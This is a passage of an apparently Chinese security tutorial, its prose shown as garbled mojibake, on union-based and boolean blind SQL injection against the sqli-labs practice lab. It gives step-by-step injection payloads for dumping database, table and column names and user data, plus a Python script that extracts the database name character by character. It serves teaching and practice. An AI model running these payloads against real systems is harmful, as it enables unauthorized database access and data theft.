<p>éœ€è¦æ³¨æ„çš„æ˜¯unionåé¢çš„å­—æ®µæ•°è¦å’Œå‰é¢selectçš„å­—æ®µæ˜¯ä¿æŒä¸€è‡´ï¼Œå¦åˆ™å°±ä¼šæŠ¥é”™ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆè¦å…ˆåˆ¤æ–­å­—æ®µæ•°çš„åŸå› ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224736.png" /></p>
<h4 id="group_concat">2.3.1.3. group_concat()</h4>
<p>GROUP_CONCATå‡½æ•°è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœï¼Œè¯¥ç»“æœç”±åˆ†ç»„ä¸­çš„å€¼è¿æ¥ç»„åˆè€Œæˆã€‚</p>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(columnName1,columnName2,...) <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>ä¸­é—´ä¹Ÿå¯ä»¥æ˜¯å…¶ä»–ç‚¹ï¼Œæ¯”å¦‚ä¹‹å‰åœ¨[[#æ•°æ®åº“å¿…å¤‡çŸ¥è¯†ç‚¹]]ä¸­å°±æåˆ°çš„ã€‚</p>
</blockquote>
<p>ä¾‹å­ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423223836.png" /></p>
<p>å¯ä»¥çœ‹åˆ°idå’Œusernameè¢«æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²è¿”å›äº†ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªç±»ä¼¼çš„å‡½æ•°concat()ï¼Œè¿™å°±æ˜¯ç®€å•çš„è®²å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œåœ¨ç›²æ³¨ä¸­ä¼šç”¨åˆ°ã€‚</p>
<h3 id="åˆ¤æ–­å­—æ®µæ•°å¹¶ç¡®å®šå›æ˜¾ä½">2.3.2. åˆ¤æ–­å­—æ®µæ•°å¹¶ç¡®å®šå›æ˜¾ä½</h3>
<h4 id="åˆ¤æ–­å­—æ®µæ•°">2.3.2.1. åˆ¤æ–­å­—æ®µæ•°</h4>
<p>å¸¸ç”¨çš„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; order by 1,2,3,4--+ </span><br><span class="line"></span><br><span class="line">åé¢çš„æ•°å­—ä»£è¡¨æœ‰å‡ ä¸ªå­—æ®µæ•°ï¼Œå¯ä»¥éšä¾¿å†™ï¼Œä¸è¿‡æœ€å¥½æŒ‰é¡ºåºå†™ï¼Œè¿™æ ·æ¯”è¾ƒå®¹æ˜“ç¡®å®š</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœå­—æ®µæ•°ä¸å¯¹çš„è¯ï¼Œå°±ä¼šæŠ¥é”™ï¼›å¦‚æœå­—æ®µæ­£ç¡®çš„è¯å°±ä¼šæ˜¾ç¤ºid=1çš„ç»“æœã€‚ï¼ˆæ‰€ä»¥è¿™é‡Œçš„idçš„å€¼æœ€å¥½æ•°æ®åº“ä¸­å­˜åœ¨ï¼‰</p>
<p>è¿˜æ˜¯ä»¥sqli-labsç¬¬1å…³ä¸ºä¾‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224352.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423224404.png" /></p>
<h4 id="ç¡®å®šå›æ˜¾ä½">2.3.2.2. ç¡®å®šå›æ˜¾ä½</h4>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3--+</span><br></pre></td></tr></table></figure></p>
<p>ä»¥sqli-labsç¬¬1å…³ä¸ºä¾‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225107.png" /></p>
<p>é‚£ä¹ˆæ¥ä¸‹æ¥è·å–æ•°æ®åº“ï¼Œè¡¨ï¼Œåˆ—çš„ç›¸å…³ä¿¡æ¯çš„æ—¶å€™å°±å¯ä»¥é€šè¿‡è¿™äº›ä½ç½®æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯æ­¤æ—¶idçš„å€¼ä¸€å®šè¦æ˜¯ä¸å­˜åœ¨çš„ã€‚å¦‚æœidå€¼å­˜åœ¨ï¼Œé‚£ä¹ˆè¿”å›çš„ç»“æœå°±ä¼šæœ‰è‡³å°‘ä¸¤è¡Œï¼Œä¸€è¡Œæ˜¯å¯¹åº”idçš„ä¿¡æ¯ï¼Œå¦ä¸€è¡Œå°±æ˜¯1ï¼Œ2ï¼Œ3ã€‚ä¾‹å­å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225604.png" /></p>
<p>å¦‚æœidä¸å­˜åœ¨çš„è¯ï¼Œå°±åªä¼šè¿”å›ä¸€è¡Œï¼Œä¹Ÿå°±æ˜¯1ï¼Œ2ï¼Œ3é‚£ä¸€è¡Œã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225641.png" /></p>
<p>åªæœ‰è¿™æ ·ï¼Œæ‰èƒ½å¤Ÿåˆ¤æ–­å‡ºå›æ˜¾ä½åˆ°åº•æ˜¯å“ªä¸€ä¸ªã€‚</p>
<h3 id="è·å–æ•°æ®åº“å">2.3.3. è·å–æ•°æ®åº“å</h3>
<p>å¸¸è§„çš„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure></p>
<p>ä»¥sqli-labsç¬¬1å…³ä¸ºä¾‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423225924.png" /></p>
<p>è¿™ä¸€æ­¥è¿˜å¯ä»¥è·å–å…¶ä»–ä¿¡æ¯ï¼Œæ¯”å¦‚è¯´ç”¨æˆ·åã€æ“ä½œç³»ç»Ÿä»¥åŠæ•°æ®åº“ç‰ˆæœ¬ä¹‹ç±»çš„ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,user(),version()--+</span><br><span class="line">?id=-1&#x27; union select 1,database(),@@version_compile_os--+</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230114.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230126.png" /></p>
<h3 id="è·å–ç‰¹å®šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨å">2.3.4. è·å–ç‰¹å®šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨å</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;databaseName&#x27;),3--+</span><br><span class="line"></span><br><span class="line">databaseNameä¸ºä¸Šä¸€æ­¥è·å–çš„ã€‚</span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span><br></pre></td></tr></table></figure></p>
<p>ä»¥sqli-labsç¬¬1å…³ä¸ºä¾‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423230715.png" /></p>
<h3 id="è·å–ç‰¹å®šè¡¨ä¸‹é¢çš„æ‰€æœ‰åˆ—å">2.3.5. è·å–ç‰¹å®šè¡¨ä¸‹é¢çš„æ‰€æœ‰åˆ—å</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;tableName&#x27;),3--+</span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;tableName&#x27;),3--+</span><br></pre></td></tr></table></figure></p>
<p>å…¶ä¸­tableNameå°±æ˜¯ä¸Šä¸€æ­¥è·å¾—çš„æ‰€æœ‰è¡¨åä¸­ä½ æƒ³è¦æŸ¥çœ‹çš„é‚£ä¸€ä¸ª</p>
<p>ç¬¬äºŒç§payloadåªä¸è¿‡æŠŠæ•°æ®åº“ä¹ŸåŠ å…¥äº†æ¡ä»¶ï¼Œä¸åŠ ä¹Ÿå¯ä»¥ã€‚å‡è®¾éœ€è¦æŸ¥çœ‹securityæ•°æ®åº“ä¸‹é¢çš„usersè¡¨ï¼Œå¦‚æœå­˜åœ¨å¤šä¸ªæ•°æ®åº“ä¸‹é¢æœ‰usersè¡¨ï¼Œé‚£ä¹ˆä½¿ç”¨ç¬¬ä¸€ç§payloadå°±ä¼šè·å¾—å¤šä¸ªæ•°æ®åº“ä¸‹çš„userè¡¨çš„æ‰€æœ‰åˆ—åï¼ˆå› ä¸ºinformation_schemaä¸­åŒ…å¥½äº†æ‰€æœ‰çš„æ•°æ®åº“ã€è¡¨ã€åˆ—çš„ä¿¡æ¯ï¼‰ï¼Œè¿™æ ·å­ä¸åˆ©äºåˆ†æè‡ªå·±æƒ³è¦çš„åˆ—ååˆ°åº•å±äºå“ªä¸€ä¸ªæ•°æ®åº“çš„usersè¡¨ã€‚</p>
<p>ä»¥sqli-labsç¬¬1å…³ä¸ºä¾‹ï¼š</p>
<p>ç¬¬ä¸€ç§payloadçš„ç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423231443.png" /></p>
<p>ç¬¬äºŒç§payloadçš„ç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423231520.png" /></p>
<p>å¯ä»¥æ˜æ˜¾çœ‹åˆ°åŒºåˆ«ã€‚</p>
<h3 id="è·å–è·å–ç‰¹å®šåˆ—çš„ä¿¡æ¯">2.3.6. è·å–è·å–ç‰¹å®šåˆ—çš„ä¿¡æ¯</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(columnName1[,columnName2,...]),3 from tableName--+</span><br><span class="line"></span><br><span class="line">æˆ–è€…</span><br><span class="line">?id=-1&#x27; union select 1,group_concat(columnName1[,columnName2,...]),3 from databaseName.tableName--+</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p>ç¬¬äºŒç§ä¹Ÿæ˜¯é™å®šäº†å“ªä¸€ä¸ªæ•°æ®åº“ã€‚æ­¤æ—¶æ˜¯ä¸éœ€è¦çš„ï¼Œå› ä¸ºæ²¡æœ‰ä½¿ç”¨information_schemaï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯ä»å½“å‰ä½¿ç”¨çš„æ•°æ®åº“ä¸­è·å–ä¿¡æ¯ã€‚</p>
<p>ä»¥sqli-labsç¬¬1å…³ä¸ºä¾‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423232255.png" /></p>
<h3 id="ç•ªå¤–">2.3.7. ç•ªå¤–</h3>
<p>ä¸Šé¢çš„æ¼”ç¤ºéƒ½æ˜¯åŸºäºMySQL version&gt;=5.0ã€‚å¦‚æœç‰ˆæœ¬&lt;5.0ï¼Œé‚£ä¹ˆæ•°æ®åº“ã€è¡¨ã€åˆ—çš„ä¿¡æ¯åªèƒ½é çŒœï¼Œä¸è¿‡ä¸€èˆ¬ä¹ŸçŒœä¸å‡ºæ¥å°±æ˜¯äº†ã€‚</p>
<h2 id="å¸ƒå°”ç›²æ³¨">2.4. å¸ƒå°”ç›²æ³¨</h2>
<p>å¸ƒå°”ç›²æ³¨çš„ä½¿ç”¨æ¡ä»¶ï¼š - é¡µé¢å¯¹äºSQLè¯­å¥çš„è¿”å›ç»“æœä¸äºˆä»¥æ˜¾ç¤ºï¼Œå¹¶ä¸”å¯¹äºçœŸæ¡ä»¶å’Œå‡æ¡ä»¶çš„è¿”å›å†…å®¹å­˜åœ¨å·®å¼‚</p>
<p>å› æ­¤ï¼Œå¯ä»¥ä½¿ç”¨æ°¸çœŸ(or 1=1)æˆ–è€…æ°¸å‡(and 1=2)æ¥åˆ¤æ–­é¡µé¢è¿”å›çš„å†…å®¹æ˜¯å¦å­˜åœ¨å·®å¼‚ï¼Œä»è€Œåˆ¤å®šæ˜¯å¦å¯ä»¥ä½¿ç”¨å¸ƒå°”ç›²æ³¨ã€‚</p>
<p>å¸ƒå°”ç›²æ³¨çš„æ­¥éª¤ä¸€èˆ¬æœ‰ï¼š</p>
<ol type="1">
<li>åˆ¤æ–­æ•°æ®åº“é•¿åº¦ï¼›</li>
<li>çˆ†æ•°æ®åº“åï¼›</li>
<li>çˆ†å¯¹åº”æ•°æ®åº“ä¸‹çš„group_concat(table_name)çš„é•¿åº¦ï¼›</li>
<li>çˆ†å¯¹åº”æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨åï¼›</li>
<li>çˆ†å¯¹åº”è¡¨ä¸‹çš„group_concat(column_name)çš„é•¿åº¦ï¼›</li>
<li>çˆ†å¯¹åº”è¡¨ä¸‹çš„æ‰€æœ‰å­—æ®µå</li>
<li>çˆ†å¯¹åº”å­—æ®µçš„group_concat(columnName)çš„é•¿åº¦ï¼›</li>
<li>çˆ†å¯¹åº”å­—æ®µçš„ä¿¡æ¯ï¼›</li>
</ol>
<p>å…¶ä¸­ï¼Œ3ï¼Œ5ï¼Œ7ä¸æ˜¯å¿…è¦çš„ï¼Œç›´æ¥çˆ†å¯¹åº”çš„åç§°ï¼Œè®¾ç½®ä¸€ä¸ªè¶³å¤Ÿå¤§å°çš„å¾ªç¯å³å¯ã€‚ä½†æ˜¯ä¸ºäº†æ›´å¥½çš„å†™è„šæœ¬ï¼Œè¿˜æ˜¯æ¨èåœ¨çˆ†ç ´å‰å…ˆåˆ¤æ–­é•¿åº¦ã€‚</p>
<p>æ¥ä¸‹æ¥é¦–å…ˆä»‹ç»éœ€è¦ç”¨åˆ°çš„å‡½æ•°ï¼Œç„¶åæŒ‰ç…§æ­¥éª¤ä¸€ä¸€è¯´æ˜ã€‚<strong>æ‰€æœ‰æ¼”ç¤ºéƒ½åœ¨sqli-labsç¬¬8å…³ã€‚</strong></p>
<h3 id="éœ€è¦ç”¨åˆ°çš„å‡½æ•°-1">2.4.1. éœ€è¦ç”¨åˆ°çš„å‡½æ•°</h3>
<h4 id="length">2.4.1.1. length()</h4>
<p><strong>ä½œç”¨ï¼šç”¨äºåˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦ã€‚</strong></p>
<p>è¯­æ³•: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length(str)</span><br></pre></td></tr></table></figure></p>
<p>ä¸€èˆ¬ä½¿ç”¨ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length(database())&gt;4</span><br></pre></td></tr></table></figure></p>
<p>åˆ¤æ–­æ•°æ®åº“é•¿åº¦æ˜¯å¦è¶…è¿‡4ï¼Œå¦‚æœè¶…è¿‡ï¼Œè¿™æ¡è¯­å¥çš„ç»“æœä½çœŸï¼Œå¦åˆ™ä¸ºå‡ã€‚</p>
<p><strong>æ³¨æ„ï¼šè¿™é‡Œçš„ç¬¦å·å¯ä»¥æ˜¯&gt;, &lt;, =, !=</strong></p>
<h4 id="substr-substring-mid">2.4.1.2. substr(), substring(), mid()</h4>
<p><strong>ä½œç”¨ï¼šç”¨äºæˆªå–å­—ç¬¦ä¸²ã€‚</strong></p>
<p>è¯­æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">substr(str, pos[, len])</span><br><span class="line">substring(str, pos[, len])</span><br><span class="line">mid(str, pos[, len])</span><br></pre></td></tr></table></figure></p>
<p>æ³¨æ„ï¼šMySQLä¸­æˆªå–çš„æ—¶å€™å­—ç¬¦ä¸²æ˜¯ä»1å¼€å§‹çš„ï¼å› æ­¤posæœ€å°å€¼ä¸º1ã€‚</p>
<h4 id="left-right-substring_index">2.4.1.3. left(), right(), substring_index()</h4>
<p><strong>ä½œç”¨ï¼šç”¨äºæˆªå–å­—ç¬¦ä¸²ã€‚</strong></p>
<p>è¯­æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">left(str, len) # ä»æœ€å·¦ç«¯å¼€å§‹ï¼Œæˆªå–lené•¿åº¦çš„å­—ç¬¦ä¸²</span><br><span class="line">right(str, len) # ä»æœ€å³ç«¯å¼€å§‹ï¼Œæˆªå–lené•¿åº¦çš„å­—ç¬¦ä¸²</span><br><span class="line">substring_index(str, substr, count) # æˆªå–strä¸­ç¬¬countä¸ªchrå‰é¢çš„æ‰€æœ‰å­—ç¬¦</span><br></pre></td></tr></table></figure></p>
<h4 id="ascii-ord">2.4.1.4. ascii(), ord()</h4>
<p><strong>ä½œç”¨ï¼šå°†å­—ç¬¦è½¬ä¸ºasciiç ï¼Œæ³¨æ„æ˜¯åè¿›åˆ¶çš„ã€‚</strong></p>
<p>è¯­æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(char)</span><br><span class="line">ord(char)</span><br></pre></td></tr></table></figure></p>
<p>ä¸€èˆ¬ä½¿ç”¨ï¼š(é…åˆå­—ç¬¦ä¸²æˆªå–å‡½æ•°) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(substr(database(),1,1))&gt;100</span><br><span class="line">ord(mid(database(),1,1))&gt;100</span><br></pre></td></tr></table></figure></p>
<p><strong>æ³¨æ„ï¼šè¿™é‡Œçš„ç¬¦å·å¯ä»¥æ˜¯&gt;, &lt;, =, !=</strong></p>
<h4 id="limit-poslen">2.4.1.5. limit pos,len</h4>
<p><strong>ä½œç”¨ï¼šä»posä½ç½®å¼€å§‹ï¼Œè¯»å–lenè¡Œä¿¡æ¯ã€‚</strong></p>
<p>æˆ‘ä»¬éƒ½çŸ¥é“ï¼Œå¦‚æœç›´æ¥è¾“å…¥<code>select * from users;</code>ä¼šè¿”å›å¤šè¡Œä¿¡æ¯ï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨limitå…³é”®å­—ï¼Œå°±èƒ½å¤Ÿäººä¸ºæ§åˆ¶è¿”å›å¤šå°‘è¡Œä¿¡æ¯ï¼Œè¿”å›å“ªå‡ è¡Œä¿¡æ¯ã€‚</p>
<p>æ¼”ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424100523.png" /></p>
<p>ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œä½¿ç”¨è¯¥å…³é”®è¯ï¼Œä½ç½®æ˜¯ä»0å¼€å§‹çš„ï¼Œå’Œsubstrç­‰æˆªå–å­—ç¬¦ä¸²çš„å‡½æ•°çš„å¼€å§‹ä½ç½®ä¸åŒã€‚</p>
<p><strong>ä¸»è¦çš„ä½œç”¨å°±æ˜¯ç”¨æ¥æ›¿ä»£group_concat()ã€‚å¦‚æœå›æ˜¾ä½åªæœ‰ä¸€ä½ï¼Œè€Œè¿”å›ç»“æœæœ‰å¤šè¡Œçš„æ—¶å€™å°±å¯ä»¥ä½¿ç”¨group_concat()å°†æ‰€æœ‰ç»“æœæ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åè¿›è¡Œè¿”å›ã€‚å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨limitå…³é”®è¯ï¼Œåªè¿”å›è‡ªå·±éœ€è¦çš„é‚£ä¸€è¡Œæ•°æ®ã€‚</strong></p>
<h3 id="åˆ¤æ–­æ•°æ®åº“é•¿åº¦">2.4.2. åˆ¤æ–­æ•°æ®åº“é•¿åº¦</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or length(database())&gt;7--+</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424090503.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or length(database())&gt;8--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424090452.png" /></p>
<p>å½“&gt;7çš„æ—¶å€™ï¼Œé¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼›å½“&gt;8çš„æ—¶å€™ï¼Œé¡µé¢æ˜¾ç¤ºå¼‚å¸¸ã€‚ä»è€Œåˆ¤æ–­æ•°æ®çš„é•¿åº¦åº”è¯¥ä¸º7ã€‚</p>
<p>ä¸ºäº†ä¿é™©ï¼Œå¯ä»¥ç”¨'='è¿›è¡Œä¸€æ¬¡éªŒè¯ã€‚</p>
<h3 id="çˆ†æ•°æ®åº“å">2.4.3. çˆ†æ•°æ®åº“å</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or substr(database(),1,1)=&#x27;s&#x27;--+</span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">?id=-1&#x27; or ascii(substr(database(),1,1))=115--+ # åˆ©ç”¨asciiå‡½æ•°æ˜¯ä¸ºäº†å†™è„šæœ¬çš„æ—¶å€™æ›´å¥½çš„å¾ªç¯ã€‚</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼šåˆ©ç”¨å­—ç¬¦ä¸²æˆªå–å‡½æ•°ï¼Œæ¯æ¬¡æˆªå–ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åçˆ†ç ´è¿™ä¸ªå­—ç¬¦æ˜¯ä»€ä¹ˆï¼›ç„¶åç»§ç»­çˆ†ç ´ä¸‹ä¸€ä¸ªå­—ç¬¦ï¼Œç›´åˆ°æ‰€æœ‰å­—ç¬¦éƒ½çˆ†ç ´å®Œå°±èƒ½å¤ŸçŸ¥é“æ•°æ®åº“åç§°äº†ã€‚å¯ä»¥ä¸‹ä¸€ä¸ªç®€å•çš„è„šæœ¬ä»£æ›¿ï¼Œå¦‚ä¸‹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time</span><br><span class="line">dbName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://3df26cde-054d-4730-9653-feb19f34a60a.node4.buuoj.cn/Less-8/?id=-1&#x27; or ascii(substr(database(),%d,1))=%d-- &quot;</span> <span class="comment"># ä½¿ç”¨è„šæœ¬çš„æ—¶å€™åˆ«ç”¨+ï¼Œç›´æ¥ä½¿ç”¨ç©ºæ ¼å°±å¥½</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, dbLen+<span class="number">1</span>): <span class="comment"># dbLen ä¸ºä¸Šä¸€æ­¥å¾—åˆ°çš„æ•°æ®åº“é•¿åº¦</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">128</span>): <span class="comment"># asciiç ä»0-127ï¼Œä½†æ˜¯0æ˜¯ç»“æŸç¬¦ï¼Œæ•°æ®åº“åä¸­ä¸€èˆ¬ä¸ä¼šæœ‰ï¼Œå…¶å®32ä¹‹å‰çš„éƒ½ä¸å¤ªå¯èƒ½ä¼šæœ‰</span></span><br><span class="line">		payload = url % (i, j)</span><br><span class="line">		r = requests.get(payload)</span><br><span class="line">		time.sleep(<span class="number">0.3</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;You are in&#x27;</span> <span class="keyword">in</span> r.text: <span class="comment"># åˆ¤æ–­é¡µé¢æ˜¯å¦æ­£å¸¸</span></span><br><span class="line">			dbName += <span class="built_in">chr</span>(j) <span class="comment"># å°†asciiç è½¬ä¸ºå­—ç¬¦</span></span><br><span class="line">			<span class="built_in">print</span>(<span class="string">f&quot;the <span class="subst">&#123;i&#125;</span>th of dbName is : %s&quot;</span> % <span class="built_in">chr</span>(j))</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the dbName is : %s&quot;</span> % dbName)</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424093426.png" /></p>
<p>ä¹‹åçš„æ‰€æœ‰æ­¥éª¤éƒ½å»ºè®®å†™ä¸€ä¸ªè„šæœ¬å¸®å¿™è·‘ã€‚</p>
<h3 id="çˆ†æ•°æ®åº“ä¸‹group_concattable_nameçš„é•¿åº¦">2.4.4. çˆ†æ•°æ®åº“ä¸‹group_concat(table_name)çš„é•¿åº¦</h3>
<p>å¸¸è§„padloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or length((select group_concat(table_name) from information_schema.tables where table_schema=database()))=29--+ </span><br><span class="line"></span><br><span class="line"># æ³¨æ„æ‹¬å·ï¼Œå› ä¸ºlength(str)ï¼Œæ‰€ä»¥è¦æŠŠlengthå‡½æ•°ä¸­çš„è¯­å¥è¿”å›çš„ç»“æœå½“ä½œæ•´ä½“ï¼Œæ•…ä½¿ç”¨æ‹¬å·åŒ…ä½</span><br></pre></td></tr></table></figure></p>
<h3 id="çˆ†å¯¹åº”æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨å">2.4.5. çˆ†å¯¹åº”æ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨å</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))=101--+</span><br></pre></td></tr></table></figure></p>
<h3 id="çˆ†å¯¹åº”è¡¨ä¸‹çš„group_concatcolumn_nameçš„é•¿åº¦">2.4.6. çˆ†å¯¹åº”è¡¨ä¸‹çš„group_concat(column_name)çš„é•¿åº¦</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;tableName&#x27;))=29--+ </span><br></pre></td></tr></table></figure></p>
<h3 id="çˆ†å¯¹åº”è¡¨ä¸‹çš„æ‰€æœ‰å­—æ®µå">2.4.7. çˆ†å¯¹åº”è¡¨ä¸‹çš„æ‰€æœ‰å­—æ®µå</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;tableName&#x27;),1,1))=101--+</span><br></pre></td></tr></table></figure></p>
<h3 id="çˆ†å¯¹åº”å­—æ®µçš„group_concatcolumnnameçš„é•¿åº¦">2.4.8. çˆ†å¯¹åº”å­—æ®µçš„group_concat(columnName)çš„é•¿åº¦</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1&#x27; or length((select group_concat(columnName)from dtabaseName.tableName))=55--+</span><br></pre></td></tr></table></figure></p>
<h3 id="çˆ†å¯¹åº”å­—æ®µçš„ä¿¡æ¯">2.4.9. çˆ†å¯¹åº”å­—æ®µçš„ä¿¡æ¯</h3>
<p>å¸¸è§„payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; or ascii(substr((select group_concat(columnName)from databaseName.tableName),1,1))=68--+</span><br></pre></td></tr></table></figure></p>
<h2 id="æ—¶é—´ç›²æ³¨">2.5. æ—¶é—´ç›²æ³¨</h2>
<p>æ—¶é—´ç›²æ³¨åŸç†åŒå¸ƒå°”ç›²æ³¨ï¼Œä¸è¿‡æ¡ä»¶æ›´å®½ï¼Œæ—¶é—´ç›²æ³¨å¯ä»¥ä¸éœ€è¦â€œæ ¹æ®å‚æ•°çš„çœŸå‡è¿”å›çš„é¡µé¢æœ‰å·®å¼‚â€è¿™ä¸€æ¡ä»¶ã€‚åªéœ€è¦å­˜åœ¨SQLæ³¨å…¥æ¼æ´å³å¯ã€‚</p>
<p>ä¸»è¦æ­¥éª¤åŒå¸ƒå°”ç›²æ³¨ã€‚</p>
<h3 id="éœ€è¦ç”¨åˆ°çš„å‡½æ•°-2">2.5.1. éœ€è¦ç”¨åˆ°çš„å‡½æ•°</h3>
<h4 id="if">2.5.1.1. if()</h4>
<p><strong>ä½œç”¨ï¼šæ ¹æ®æ¡ä»¶çš„çœŸå‡ï¼Œæ‰§è¡Œä¸åŒçš„è¯­å¥</strong></p>
<p>è¯­æ³•ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition, a, b)</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼šå¦‚æœconditionä¸ºçœŸï¼Œé‚£ä¹ˆ<strong>è¿”å›</strong>aï¼Œå¦åˆ™<strong>è¿”å›</strong>bã€‚</p>
<h4 id="sleep">2.5.1.2. sleep()</h4>
<p><strong>ä½œç”¨ï¼šå»¶è¿Ÿæ—¶é—´</strong></p>
